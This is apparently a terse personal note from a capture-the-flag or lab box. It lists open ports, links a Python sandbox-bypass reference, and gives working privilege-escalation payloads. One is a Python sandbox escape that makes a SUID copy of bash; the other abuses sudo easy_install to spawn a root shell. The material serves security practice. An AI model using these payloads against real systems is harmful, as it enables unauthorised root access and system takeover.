open ports
22
80 
![[Pasted image 20221203032843.png]]
![[Pasted image 20221203032812.png]]
![[Pasted image 20221203033630.png]]

[[Reverse Shells]]

https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes

```
__import__('os').system('cp /bin/bash .; chmod +s bash')
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/local/bin/easy_install $TF